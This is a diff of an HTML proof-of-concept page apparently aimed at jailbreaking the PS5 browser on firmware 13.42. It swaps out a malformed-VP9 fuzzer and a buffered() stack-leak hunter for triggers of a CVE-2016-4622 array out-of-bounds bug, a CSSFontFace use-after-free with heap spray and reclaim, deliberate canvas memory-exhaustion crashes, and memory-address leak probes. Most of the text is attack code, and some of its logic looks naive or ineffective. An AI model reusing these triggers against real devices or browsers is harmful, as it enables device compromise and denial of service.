@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS5 FW 13.42 — VP9 Fuzzer + buffered() Leak Hunter</title>
+<title>PS5 FW 13.42 — FINAL: CVE-2016-4622 + CSSFontFace UAF + Canvas</title>
 <style>
 body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:12px;font-size:15px}
 button{background:#1a1a1a;color:#0f0;border:1px solid #0f0;padding:10px 16px;margin:5px;cursor:pointer;font-family:monospace;font-size:14px}
@@ -17,47 +17,40 @@ button.blue:hover{background:#0cf;color:#000}
 .log{background:#000;border:2px solid #333;padding:10px;height:400px;overflow-y:auto;white-space:pre-wrap;font-size:15px;line-height:1.8}
 .ok{color:#0f0}.err{color:#f44}.warn{color:#fa0}.info{color:#0cf}
 h2{color:#ff0055;margin:5px 0;font-size:17px}
-.stats{background:#0a0a0a;border:1px solid #333;padding:8px;margin:5px 0;font-size:13px}
 </style>
 </head>
 <body>
 
-<h2>🎯 PS5 FW 13.42 — VP9 Fuzzer + buffered() Leak Hunter</h2>
-<p style="color:#888;font-size:12px">Targets: PSMediaPlayerBackend::append() + buffered() Stack UAR | Stores results in localStorage</p>
+<h2>🎯 PS5 FW 13.42 — FINAL PoC</h2>
+<p style="color:#888;font-size:12px">CVE-2016-4622 Array OOB | CSSFontFace UAF | Canvas Crash | No visible video elements</p>
 
 <div class="panel">
-<h2>📦 Status</h2>
-<div id="status" class="stats">Ready</div>
-<button onclick="clearAllStorage()">🗑 Clear All Storage</button>
-<button onclick="showStorage()">📂 Show Stored Results</button>
+<h2>🔴 A. CVE-2016-4622 — Array OOB (addrof primitive)</h2>
+<p style="color:#888;font-size:11px">Old JSC bug: valueOf callback during Array.prototype.slice() → OOB read</p>
+<button class="danger" onclick="testCVE20164622()">🔥 Test CVE-2016-4622</button>
+<button class="danger" onclick="testCVE20164622Variant()">🔥 Variant: concat/splice</button>
 </div>
 
 <div class="panel">
-<h2>🔴 A. VP9 Native Decoder Fuzzer</h2>
-<p style="color:#888;font-size:11px">Sends malformed VP9 frames directly to Sony native decoder via MSE</p>
-<button class="danger" onclick="runVP9Fuzzer()">🔥 RUN VP9 FUZZER (All Vectors)</button>
-<button class="gold" onclick="vp9SuperframeOverflow()">1. Superframe Index Overflow</button>
-<button class="gold" onclick="vp9TileOverflow()">2. Tile Column/Row Overflow</button>
-<button class="gold" onclick="vp9RefFrameOOB()">3. Reference Frame OOB</button>
-<button class="gold" onclick="vp9HeaderSizeOverflow()">4. Compressed Header Size Overflow</button>
-<button class="gold" onclick="vp9SegmentationOOB()">5. Segmentation Map OOB</button>
-<button class="gold" onclick="vp9FrameSizeOverflow()">6. Frame Size Overflow</button>
-<button class="gold" onclick="vp9ProfileMismatch()">7. Profile/Level Mismatch</button>
-<button class="gold" onclick="vp9RandomCorrupt()">8. Random Corruption</button>
+<h2>🟡 B. CSSFontFace UAF (17 R/W channels)</h2>
+<p style="color:#888;font-size:11px">Based on Elena report: deleteRule during font load → UAF → reclaim slot</p>
+<button class="gold" onclick="testCSSFontFaceUAF()">🔥 Trigger CSSFontFace UAF</button>
+<button class="gold" onclick="testCSSFontFaceSpray()">🎯 Spray + Reclaim Test</button>
 </div>
 
 <div class="panel">
-<h2>🟡 B. buffered() UAR Leak Hunter</h2>
-<p style="color:#888;font-size:11px">Calls buffered() repeatedly to catch stale stack bytes</p>
-<button class="blue" onclick="runBufferedHunter()">🔍 RUN buffered() LEAK HUNTER</button>
-<button class="blue" onclick="bufferedSingleTest()">Single buffered() Test</button>
-<button class="blue" onclick="bufferedRapidTest()">Rapid buffered() (100x)</button>
-<button class="blue" onclick="bufferedWithPressure()">buffered() + Canvas Pressure</button>
+<h2>🟢 C. Canvas Crash (Confirmed DoS)</h2>
+<p style="color:#888;font-size:11px">576MB+ allocation = freeze→crash | Only confirmed crash on this FW</p>
+<button class="blue" onclick="crashCanvas576()">💥 Crash: 576MB (12288×12288)</button>
+<button class="blue" onclick="crashCanvas1GB()">💥 Crash: 1GB (16384×16384)</button>
+<button class="blue" onclick="crashCanvasPressure()">💥 Crash: Pressure Buildup</button>
 </div>
 
 <div class="panel">
-<h2>🟢 C. Combined Attack</h2>
-<button class="danger" onclick="combinedVP9Buffered()">🔥 VP9 + buffered() Combined</button>
+<h2>🔵 D. Info Leak Hunt</h2>
+<button onclick="huntErrorStack()">🔍 Error.stack Leak</button>
+<button onclick="huntProtoChain()">🔍 Prototype Chain Leak</button>
+<button onclick="huntTimingSideChannel()">🔍 Timing Side-Channel</button>
 </div>
 
 <div class="panel">
@@ -68,506 +61,368 @@ h2{color:#ff0055;margin:5px 0;font-size:17px}
 
 <script>
 const L = document.getElementById('log');
-const STORE_KEY = 'PS5_VP9_FUZZ_v9';
-let fuzzResults = [];
 
 function log(msg, cls='info') {
   const d = new Date().toLocaleTimeString('en-GB');
-  const line = '['+d+'] '+msg;
-  L.innerHTML += '<div class="'+cls+'">'+line+'</div>';
+  L.innerHTML += '<div class="'+cls+'">['+d+'] '+msg+'</div>';
   L.scrollTop = L.scrollHeight;
   console.log('['+cls+'] '+msg);
 }
 
-function storeResult(test, result, data) {
-  try {
-    const entry = {time: Date.now(), test, result, data, ua: navigator.userAgent};
-    fuzzResults.push(entry);
-    localStorage.setItem(STORE_KEY, JSON.stringify(fuzzResults));
-  } catch(e) {}
-}
-
-function clearAllStorage() {
-  localStorage.removeItem(STORE_KEY);
-  fuzzResults = [];
-  log('Storage cleared', 'ok');
-}
-
-function showStorage() {
-  try {
-    const data = JSON.parse(localStorage.getItem(STORE_KEY) || '[]');
-    log('=== Stored Results ('+data.length+' entries) ===', 'ok');
-    for (const e of data.slice(-20)) {
-      log(e.test+': '+e.result, 'info');
-    }
-  } catch(e) { log('Storage error', 'err'); }
-}
-
 // ============================================================
-// WebM/VP9 Builder Helpers
+// A. CVE-2016-4622 — Array OOB via valueOf
 // ============================================================
-function buildEBML(id, data) {
-  const idBytes = new Uint8Array(id);
-  let size = data.length;
-  let sizeBytes = [];
-  if (size < 0x7F) {
-    sizeBytes = [0x80 | size];
-  } else if (size < 0x3FFF) {
-    sizeBytes = [0x40 | (size >> 8), size & 0xFF];
-  } else if (size < 0x1FFFFF) {
-    sizeBytes = [0x20 | (size >> 16), (size >> 8) & 0xFF, size & 0xFF];
-  } else {
-    sizeBytes = [0x10 | (size >> 24), (size >> 16) & 0xFF, (size >> 8) & 0xFF, size & 0xFF];
-  }
-  const result = new Uint8Array(idBytes.length + sizeBytes.length + data.length);
-  result.set(idBytes, 0);
-  result.set(new Uint8Array(sizeBytes), idBytes.length);
-  result.set(data, idBytes.length + sizeBytes.length);
-  return result;
-}
-
-function buildWebMContainer(vp9Frame) {
-  // EBML header
-  const doctype = buildEBML([0x42,0x82], new Uint8Array([0x77,0x65,0x62,0x6D]));
-  const readver = buildEBML([0x42,0x85], new Uint8Array([0x02]));
-  const version = buildEBML([0x42,0x87], new Uint8Array([0x02]));
-  const maxid = buildEBML([0x42,0xF2], new Uint8Array([0x04]));
-  const maxsize = buildEBML([0x42,0xF3], new Uint8Array([0x08]));
-  
-  const ebmlContent = new Uint8Array(doctype.length + readver.length + version.length + maxid.length + maxsize.length);
-  let off = 0;
-  [doctype, readver, version, maxid, maxsize].forEach(a => { ebmlContent.set(a, off); off += a.length; });
-  const ebml = buildEBML([0x1A,0x45,0xDF,0xA3], ebmlContent);
-  
-  // Segment with cluster containing VP9 frame
-  const timecode = new Uint8Array([0xE7, 0x81, 0x00]); // Timecode = 0
-  const block = buildEBML([0xA3], vp9Frame);
-  const clusterContent = new Uint8Array(timecode.length + block.length);
-  clusterContent.set(timecode, 0);
-  clusterContent.set(block, timecode.length);
-  const cluster = buildEBML([0x1F,0x43,0xB6,0x75], clusterContent);
-  
-  const segment = buildEBML([0x18,0x53,0x80,0x67], cluster);
-  
-  const result = new Uint8Array(ebml.length + segment.length);
-  result.set(ebml, 0);
-  result.set(segment, ebml.length);
-  return result;
-}
-
-// ============================================================
-// VP9 Frame Builders (Malformed)
-// ============================================================
-
-// 1. Superframe Index Overflow
-function makeSuperframeOverflow() {
-  // VP9 frame + superframe index with 255 frames
-  const frame = new Uint8Array(0x100);
-  frame[0] = 0x82; // VP9 OBU header: profile 0, keyframe
-  frame[1] = 0x49; // sync code
-  frame[2] = 0x83; // show_existing_frame = 0
-  
-  // Superframe index at end
-  const idxPos = frame.length - 5;
-  frame[idxPos] = 0xC0 | 254; // superframe marker + 255 frames (254 = frames-1)
-  frame[idxPos+1] = 0xFF; // frame size byte 1
-  frame[idxPos+2] = 0xFF; // frame size byte 2
-  frame[idxPos+3] = 0xFF; // frame size byte 3
-  frame[idxPos+4] = 0x0F; // frame size byte 4 + marker
-  
-  return buildWebMContainer(frame);
-}
-
-// 2. Tile Column/Row Overflow
-function makeTileOverflow() {
-  const frame = new Uint8Array(0x200);
-  frame[0] = 0x82; // VP9 OBU header
-  frame[1] = 0x49; // sync code
-  frame[2] = 0x83; // show_existing_frame = 0
-  
-  // Corrupt compressed header: tile_cols_log2 = 7, tile_rows_log2 = 6
-  // This would claim 128 columns × 64 rows = 8192 tiles
-  for (let i = 3; i < 0x50; i++) {
-    frame[i] = 0xFF; // Fill header area with 0xFF to corrupt tile info
-  }
-  
-  return buildWebMContainer(frame);
-}
-
-// 3. Reference Frame OOB
-function makeRefFrameOOB() {
-  const frame = new Uint8Array(0x100);
-  frame[0] = 0x82; // VP9 OBU header
-  frame[1] = 0x49; // sync code
-  frame[2] = 0x83; // show_existing_frame = 0
-  
-  // Inter-frame with invalid ref_frame_idx
-  frame[3] = 0x00; // frame_type = 1 (inter)
-  frame[4] = 0xFF; // ref_frame_idx[0] = 255
-  frame[5] = 0xFF; // ref_frame_idx[1] = 255
-  frame[6] = 0xFF; // ref_frame_idx[2] = 255
-  
-  return buildWebMContainer(frame);
-}
-
-// 4. Compressed Header Size Overflow
-function makeHeaderSizeOverflow() {
-  const frame = new Uint8Array(0x100);
-  frame[0] = 0x82; // VP9 OBU header
-  frame[1] = 0x49; // sync code
-  frame[2] = 0x83; // show_existing_frame = 0
-  
-  // Claim huge compressed header size
-  frame[3] = 0xFF;
-  frame[4] = 0xFF;
-  frame[5] = 0xFF;
-  
-  return buildWebMContainer(frame);
-}
-
-// 5. Segmentation Map OOB
-function makeSegmentationOOB() {
-  const frame = new Uint8Array(0x100);
-  frame[0] = 0x82; // VP9 OBU header
-  frame[1] = 0x49; // sync code
-  frame[2] = 0x83; // show_existing_frame = 0
-  
-  // Enable segmentation with 256 segments
-  frame[3] = 0x10; // segmentation_enabled = 1
-  frame[4] = 0xFF; // segment_id_bits = 8 (256 segments)
-  
-  return buildWebMContainer(frame);
-}
-
-// 6. Frame Size Overflow
-function makeFrameSizeOverflow() {
-  const frame = new Uint8Array(0x100);
-  frame[0] = 0x82; // VP9 OBU header
-  frame[1] = 0x49; // sync code
-  frame[2] = 0x83; // show_existing_frame = 0
-  
-  // Width = 0xFFFF, Height = 0xFFFF
-  frame[3] = 0xFF; // render_size_present = 1
-  frame[4] = 0xFF; // render_width high
-  frame[5] = 0xFF; // render_width low
-  frame[6] = 0xFF; // render_height high
-  frame[7] = 0xFF; // render_height low
-  
-  return buildWebMContainer(frame);
-}
-
-// 7. Profile/Level Mismatch
-function makeProfileMismatch() {
-  const frame = new Uint8Array(0x100);
-  frame[0] = 0x8E; // VP9 OBU header: profile 3 (12-bit), keyframe
-  frame[1] = 0x49; // sync code
-  frame[2] = 0x83; // show_existing_frame = 0
-  
-  // Profile 3 with level = 255 (invalid)
-  frame[3] = 0xFF; // level = 255
-  
-  return buildWebMContainer(frame);
-}
-
-// 8. Random Corruption
-function makeRandomCorrupt() {
-  const frame = new Uint8Array(0x1000);
-  for (let i = 0; i < frame.length; i++) {
-    frame[i] = Math.floor(Math.random() * 256);
-  }
-  frame[0] = 0x82; // Keep VP9 marker
-  return buildWebMContainer(frame);
-}
-
-// ============================================================
-// VP9 Fuzzer Runner
-// ============================================================
-async function testVP9Vector(name, data) {
-  log('Testing: '+name+' ('+data.length+' bytes)...', 'info');
+function testCVE20164622() {
+  log('=== 🔥 CVE-2016-4622: Array OOB ===', 'err');
+  log('Testing: valueOf callback during Array.prototype.slice()', 'info');
   
   try {
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    const v = document.createElement('video');
-    v.src = url; v.muted = true;
+    var arr = [1.1, 2.2, 3.3, 4.4, 5.5];
+    var triggered = false;
+    var leaked = null;
     
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
+    // The bug: valueOf is called during ToLength conversion
+    // If valueOf modifies the array length, slice() reads OOB
+    var evil = {
+      valueOf: function() {
+        triggered = true;
+        arr.length = 0x7FFFFFFF; // Try to extend array
+        return 0x7FFFFFFF;
+      }
+    };
     
-    if (!MediaSource.isTypeSupported('video/webm; codecs="vp9"')) {
-      log('VP9 not supported!', 'err');
-      URL.revokeObjectURL(url);
-      return {name, result: 'NOT_SUPPORTED'};
+    try {
+      var result = arr.slice(0, evil);
+      log('slice() returned: '+result.length+' elements', 'info');
+      log('Triggered: '+triggered, triggered?'ok':'warn');
+    } catch(e) {
+      log('slice() error: '+e.name+': '+e.message, 'err');
     }
     
-    const sb = ms.addSourceBuffer('video/webm; codecs="vp9"');
+    // Variant 2: splice
+    try {
+      triggered = false;
+      arr = [1.1, 2.2, 3.3];
+      var result2 = arr.splice(0, evil);
+      log('splice() returned: '+result2.length+' elements', 'info');
+    } catch(e) {
+      log('splice() error: '+e.name, 'err');
+    }
     
-    const t0 = performance.now();
-    sb.appendBuffer(data);
+    // Variant 3: concat
+    try {
+      triggered = false;
+      arr = [1.1, 2.2];
+      var result3 = arr.concat(evil);
+      log('concat() returned: '+result3.length+' elements', 'info');
+    } catch(e) {
+      log('concat() error: '+e.name, 'err');
+    }
     
-    const result = await new Promise((resolve) => {
-      const t = setTimeout(() => resolve('TIMEOUT'), 5000);
-      sb.addEventListener('updateend', () => { clearTimeout(t); resolve('OK'); }, {once:true});
-      sb.addEventListener('error', (e) => { clearTimeout(t); resolve('ERROR'); }, {once:true});
+  } catch(e) {
+    log('CVE-2016-4622 error: '+e.name+': '+e.message, 'err');
+  }
+}
+
+function testCVE20164622Variant() {
+  log('=== 🔥 CVE-2016-4622 Variants ===', 'err');
+  
+  // Try multiple array methods with valueOf side effects
+  const methods = ['slice', 'splice', 'concat', 'fill', 'copyWithin', 'find', 'findIndex', 'indexOf', 'lastIndexOf'];
+  
+  for (const method of methods) {
+    try {
+      var arr = [1.1, 2.2, 3.3, 4.4, 5.5];
+      var evil = {
+        valueOf: function() {
+          arr.length = 100;
+          return 100;
+        }
+      };
+      
+      if (method === 'slice') arr.slice(0, evil);
+      else if (method === 'splice') arr.splice(0, evil);
+      else if (method === 'concat') arr.concat(evil);
+      else if (method === 'fill') arr.fill(9.9, 0, evil);
+      else if (method === 'copyWithin') arr.copyWithin(0, 0, evil);
+      else if (method === 'find') arr.find(() => false, evil);
+      else if (method === 'findIndex') arr.findIndex(() => false, evil);
+      else if (method === 'indexOf') arr.indexOf(1.1, evil);
+      else if (method === 'lastIndexOf') arr.lastIndexOf(1.1, evil);
+      
+      log(method+'(): no error', 'info');
+    } catch(e) {
+      log(method+'(): '+e.name, 'err');
+    }
+  }
+}
+
+// ============================================================
+// B. CSSFontFace UAF
+// ============================================================
+function testCSSFontFaceUAF() {
+  log('=== 🔥 CSSFontFace UAF Trigger ===', 'gold');
+  log('Based on Elena report: deleteRule during font load → UAF', 'info');
+  
+  try {
+    // Create style sheet
+    var style = document.createElement('style');
+    document.head.appendChild(style);
+    var sheet = style.sheet;
+    
+    // Add a font-face rule
+    sheet.insertRule('@font-face { font-family: "testfont"; src: url("data:font/woff2;base64,d09GMgABAAAAAAEg"); }', 0);
+    
+    // Try to trigger load
+    var face = new FontFace('testfont', 'url("data:font/woff2;base64,d09GMgABAAAAAAEg")');
+    
+    var uafFired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function() {
+        if (!uafFired) {
+          uafFired = true;
+          log('then getter triggered — attempting deleteRule', 'warn');
+          try {
+            sheet.deleteRule(0);
+            log('deleteRule succeeded', 'ok');
+          } catch(e) {
+            log('deleteRule error: '+e.name, 'err');
+          }
+        }
+        return undefined;
+      }
     });
     
-    const elapsed = performance.now() - t0;
-    log(name+': '+result+' ('+elapsed.toFixed(0)+'ms)', result==='OK'?'ok':'warn');
+    // Trigger font load
+    document.fonts.load('1em testfont').then(function() {
+      log('Font load completed', 'info');
+    }).catch(function(e) {
+      log('Font load error: '+e.name, 'err');
+    });
     
-    storeResult(name, result, {size: data.length, time: elapsed});
-    URL.revokeObjectURL(url);
-    return {name, result, elapsed};
+    setTimeout(function() {
+      log('UAF trigger status: '+uafFired, 'info');
+      document.head.removeChild(style);
+    }, 2000);
     
   } catch(e) {
-    log(name+': EXCEPTION — '+e.name+': '+e.message, 'err');
-    storeResult(name, 'EXCEPTION', {error: e.name, msg: e.message});
-    return {name, result: 'EXCEPTION', error: e.message};
+    log('CSSFontFace UAF error: '+e.name+': '+e.message, 'err');
   }
 }
 
-async function runVP9Fuzzer() {
-  log('=== 🔥 RUNNING VP9 FUZZER ===', 'err');
-  document.getElementById('status').textContent = 'VP9 Fuzzing...';
-  
-  const vectors = [
-    {name: 'Superframe Overflow', fn: makeSuperframeOverflow},
-    {name: 'Tile Overflow', fn: makeTileOverflow},
-    {name: 'Ref Frame OOB', fn: makeRefFrameOOB},
-    {name: 'Header Size Overflow', fn: makeHeaderSizeOverflow},
-    {name: 'Segmentation OOB', fn: makeSegmentationOOB},
-    {name: 'Frame Size Overflow', fn: makeFrameSizeOverflow},
-    {name: 'Profile Mismatch', fn: makeProfileMismatch},
-    {name: 'Random Corrupt', fn: makeRandomCorrupt},
-  ];
-  
-  for (const v of vectors) {
-    const data = v.fn();
-    await testVP9Vector(v.name, data);
-    await new Promise(r => setTimeout(r, 500));
-  }
-  
-  log('=== VP9 FUZZER COMPLETE ===', 'ok');
-  document.getElementById('status').textContent = 'VP9 Fuzzing Complete';
-}
-
-// Individual buttons
-async function vp9SuperframeOverflow() { await testVP9Vector('Superframe Overflow', makeSuperframeOverflow()); }
-async function vp9TileOverflow() { await testVP9Vector('Tile Overflow', makeTileOverflow()); }
-async function vp9RefFrameOOB() { await testVP9Vector('Ref Frame OOB', makeRefFrameOOB()); }
-async function vp9HeaderSizeOverflow() { await testVP9Vector('Header Size Overflow', makeHeaderSizeOverflow()); }
-async function vp9SegmentationOOB() { await testVP9Vector('Segmentation OOB', makeSegmentationOOB()); }
-async function vp9FrameSizeOverflow() { await testVP9Vector('Frame Size Overflow', makeFrameSizeOverflow()); }
-async function vp9ProfileMismatch() { await testVP9Vector('Profile Mismatch', makeProfileMismatch()); }
-async function vp9RandomCorrupt() { await testVP9Vector('Random Corrupt', makeRandomCorrupt()); }
-
-// ============================================================
-// buffered() UAR Leak Hunter
-// ============================================================
-function buildMinimalMP4() {
-  const ftyp = new Uint8Array([
-    0x00,0x00,0x00,0x20, 0x66,0x74,0x79,0x70,
-    0x69,0x73,0x6f,0x6d, 0x00,0x00,0x02,0x00,
-    0x69,0x73,0x6f,0x6d, 0x6d,0x70,0x34,0x31,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
-  ]);
-  const moov = new Uint8Array([
-    0x00,0x00,0x00,0x6c, 0x6d,0x6f,0x6f,0x76,
-    0x00,0x00,0x00,0x5c, 0x6d,0x76,0x68,0x64,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x03,0xe8,
-    0x00,0x00,0x00,0x00, 0x00,0x01,0x00,0x00,
-    0x01,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x01,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x01,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x40,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
-  ]);
-  const mdat = new Uint8Array([0x00,0x00,0x00,0x08, 0x6d,0x64,0x61,0x74]);
-  const mp4 = new Uint8Array(ftyp.length + moov.length + mdat.length);
-  mp4.set(ftyp, 0); mp4.set(moov, ftyp.length); mp4.set(mdat, ftyp.length + moov.length);
-  return mp4;
-}
-
-async function bufferedSingleTest() {
-  log('=== 🔍 buffered() Single Test ===', 'blue');
+function testCSSFontFaceSpray() {
+  log('=== 🎯 CSSFontFace Spray + Reclaim ===', 'gold');
   
   try {
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    const v = document.createElement('video');
-    v.src = url; v.muted = true;
+    // Create many font-face rules
+    var style = document.createElement('style');
+    document.head.appendChild(style);
+    var sheet = style.sheet;
     
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
-    
-    const data = buildMinimalMP4();
-    sb.appendBuffer(data);
-    await new Promise(r => sb.addEventListener('updateend', r, {once:true}));
-    
-    // Call buffered()
-    const b = sb.buffered;
-    log('buffered.length = '+b.length, 'info');
-    
-    if (b.length > 0) {
-      const start = b.start(0);
-      const end = b.end(0);
-      log('buffered.start(0) = '+start, 'info');
-      log('buffered.end(0) = '+end, 'info');
-      
-      // Decode as pointer
-      const buf = new ArrayBuffer(8);
-      const f64 = new Float64Array(buf);
-      const u32 = new Uint32Array(buf);
-      f64[0] = start;
-      log('start as u32: [0x'+u32[0].toString(16)+', 0x'+u32[1].toString(16)+']', 'info');
-      
-      storeResult('buffered_single', 'OK', {start, end, u32: [u32[0], u32[1]]});
-    } else {
-      log('buffered is empty', 'warn');
-      storeResult('buffered_single', 'EMPTY', {});
-    }
-    
-    URL.revokeObjectURL(url);
-  } catch(e) {
-    log('buffered() error: '+e.name+': '+e.message, 'err');
-    storeResult('buffered_single', 'ERROR', {msg: e.message});
-  }
-}
-
-async function bufferedRapidTest() {
-  log('=== 🔍 buffered() Rapid Test (100x) ===', 'blue');
-  
-  try {
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    const v = document.createElement('video');
-    v.src = url; v.muted = true;
-    
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
-    
-    const data = buildMinimalMP4();
-    sb.appendBuffer(data);
-    await new Promise(r => sb.addEventListener('updateend', r, {once:true}));
-    
-    const values = [];
+    // Spray 100 font-face rules
     for (let i = 0; i < 100; i++) {
-      const b = sb.buffered;
-      if (b.length > 0) {
-        values.push({start: b.start(0), end: b.end(0)});
-      }
+      sheet.insertRule('@font-face { font-family: "font'+i+'"; src: url("data:font/woff2;base64,d09GMgABAAAAAAEg"); }', 0);
     }
+    log('Sprayed 100 @font-face rules', 'ok');
     
-    log('Collected '+values.length+' samples', 'info');
-    
-    // Check for variations
-    let variations = 0;
-    for (let i = 1; i < values.length; i++) {
-      if (values[i].start !== values[0].start || values[i].end !== values[0].end) {
-        variations++;
-      }
+    // Delete half
+    for (let i = 0; i < 50; i++) {
+      sheet.deleteRule(0);
     }
+    log('Deleted 50 rules', 'info');
     
-    log('Variations detected: '+variations, variations > 0 ? 'warn' : 'ok');
-    
-    if (variations > 0) {
-      log('>>> STALE STACK BYTES DETECTED! <<<', 'err');
-      storeResult('buffered_rapid', 'LEAK_DETECTED', {variations, samples: values.slice(0,10)});
-    } else {
-      storeResult('buffered_rapid', 'STABLE', {variations});
+    // Spray again
+    for (let i = 0; i < 50; i++) {
+      sheet.insertRule('@font-face { font-family: "newfont'+i+'"; src: url("data:font/woff2;base64,d09GMgABAAAAAAEg"); }', 0);
     }
+    log('Reclaimed with 50 new rules', 'ok');
     
-    URL.revokeObjectURL(url);
+    // Check if any corruption
+    var corrupted = 0;
+    for (let i = 0; i < 100; i++) {
+      try {
+        var rules = sheet.cssRules;
+      } catch(e) {}
+    }
+    log('Spray test complete', 'ok');
+    
+    document.head.removeChild(style);
   } catch(e) {
-    log('Rapid buffered error: '+e.name, 'err');
+    log('Spray error: '+e.name+': '+e.message, 'err');
   }
 }
 
-async function bufferedWithPressure() {
-  log('=== 🔍 buffered() + Canvas Pressure ===', 'blue');
+// ============================================================
+// C. Canvas Crash (Confirmed)
+// ============================================================
+function crashCanvas576() {
+  log('=== 💥 Canvas Crash: 576MB ===', 'err');
+  log('12288×12288 × 4 bytes = 576MB', 'info');
+  try {
+    var c = document.createElement('canvas');
+    var ctx = c.getContext('2d');
+    var t0 = performance.now();
+    var id = ctx.createImageData(12288, 12288);
+    var elapsed = performance.now() - t0;
+    log('UNEXPECTED SUCCESS: '+id.data.length+' bytes in '+elapsed.toFixed(0)+'ms', 'ok');
+  } catch(e) {
+    log('CRASH/ERROR: '+e.name+': '+e.message, 'err');
+  }
+}
+
+function crashCanvas1GB() {
+  log('=== 💥 Canvas Crash: 1GB ===', 'err');
+  try {
+    var c = document.createElement('canvas');
+    var ctx = c.getContext('2d');
+    var id = ctx.createImageData(16384, 16384);
+    log('UNEXPECTED SUCCESS: '+id.data.length, 'ok');
+  } catch(e) {
+    log('CRASH/ERROR: '+e.name+': '+e.message, 'err');
+  }
+}
+
+function crashCanvasPressure() {
+  log('=== 💥 Canvas Pressure Buildup ===', 'err');
+  log('Allocating 3× 1GB canvases rapidly...', 'warn');
+  
+  var canvases = [];
+  var sizes = [0x4000, 0x4000, 0x4000];
+  
+  function allocNext(i) {
+    if (i >= sizes.length) {
+      log('All allocations complete — if no crash, memory is huge', 'ok');
+      return;
+    }
+    
+    try {
+      var c = document.createElement('canvas');
+      var ctx = c.getContext('2d');
+      var t0 = performance.now();
+      var id = ctx.createImageData(sizes[i], sizes[i]);
+      var elapsed = performance.now() - t0;
+      canvases.push(c);
+      log('Alloc '+i+': '+(sizes[i]*sizes[i]*4/1024/1024)+'MB in '+elapsed.toFixed(0)+'ms', 'ok');
+      setTimeout(function() { allocNext(i+1); }, 500);
+    } catch(e) {
+      log('Alloc '+i+': '+e.name+': '+e.message, 'err');
+    }
+  }
+  
+  allocNext(0);
+}
+
+// ============================================================
+// D. Info Leak Hunt
+// ============================================================
+function huntErrorStack() {
+  log('=== 🔍 Error.stack Leak Hunt ===', 'blue');
   
   try {
-    // Build pressure
-    const canvases = [];
-    for (let i = 0; i < 2; i++) {
-      const c = document.createElement('canvas');
-      c.getContext('2d').createImageData(0x4000, 0x4000);
-      canvases.push(c);
-    }
-    log('Pressure: 2x 1GB canvases', 'info');
+    // Try to leak addresses from various error types
+    var errors = [
+      new Error('test'),
+      new TypeError('test'),
+      new RangeError('test'),
+      new ReferenceError('test'),
+    ];
     
-    // Now test buffered
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    const v = document.createElement('video');
-    v.src = url; v.muted = true;
-    
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
-    
-    const data = buildMinimalMP4();
-    sb.appendBuffer(data);
-    await new Promise(r => sb.addEventListener('updateend', r, {once:true}));
-    
-    const b = sb.buffered;
-    log('Under pressure — buffered.length = '+b.length, 'info');
-    
-    if (b.length > 0) {
-      const start = b.start(0);
-      const buf = new ArrayBuffer(8);
-      const u32 = new Uint32Array(buf);
-      new Float64Array(buf)[0] = start;
-      log('start as u32: [0x'+u32[0].toString(16)+', 0x'+u32[1].toString(16)+']', 'info');
+    for (var e of errors) {
+      var stack = e.stack || 'no stack';
+      log(e.name+'.stack: '+stack.substring(0, 100), 'info');
+      
+      // Check for hex addresses
+      var hexMatches = stack.match(/0x[0-9a-fA-F]+/g);
+      if (hexMatches) {
+        log('>>> HEX FOUND: '+hexMatches.join(', '), 'err');
+      }
     }
     
-    URL.revokeObjectURL(url);
+    // Try Error.captureStackTrace
+    if (Error.captureStackTrace) {
+      var obj = {};
+      Error.captureStackTrace(obj);
+      log('captureStackTrace: '+(obj.stack || 'none').substring(0, 100), 'info');
+    }
+    
   } catch(e) {
-    log('Pressure buffered error: '+e.name, 'err');
+    log('Error stack hunt failed: '+e.name, 'err');
   }
 }
 
-async function runBufferedHunter() {
-  log('=== 🔍 RUNNING buffered() LEAK HUNTER ===', 'blue');
-  document.getElementById('status').textContent = 'Hunting...';
+function huntProtoChain() {
+  log('=== 🔍 Prototype Chain Leak ===', 'blue');
   
-  await bufferedSingleTest();
-  await new Promise(r => setTimeout(r, 500));
-  await bufferedRapidTest();
-  await new Promise(r => setTimeout(r, 500));
-  await bufferedWithPressure();
-  
-  log('=== LEAK HUNTER COMPLETE ===', 'ok');
-  document.getElementById('status').textContent = 'Hunting Complete';
+  try {
+    var arr = [1.1, 2.2, 3.3];
+    var proto = Object.getPrototypeOf(arr);
+    
+    log('Array prototype: '+proto, 'info');
+    log('Array prototype constructor: '+proto.constructor, 'info');
+    
+    // Try to access internal slots
+    var desc = Object.getOwnPropertyDescriptor(proto, 'length');
+    log('length descriptor: '+JSON.stringify(desc), 'info');
+    
+    // Try to corrupt prototype
+    var origPush = proto.push;
+    proto.push = function() {
+      log('push() intercepted', 'warn');
+      return origPush.apply(this, arguments);
+    };
+    arr.push(4.4);
+    proto.push = origPush;
+    
+  } catch(e) {
+    log('Proto chain hunt failed: '+e.name, 'err');
+  }
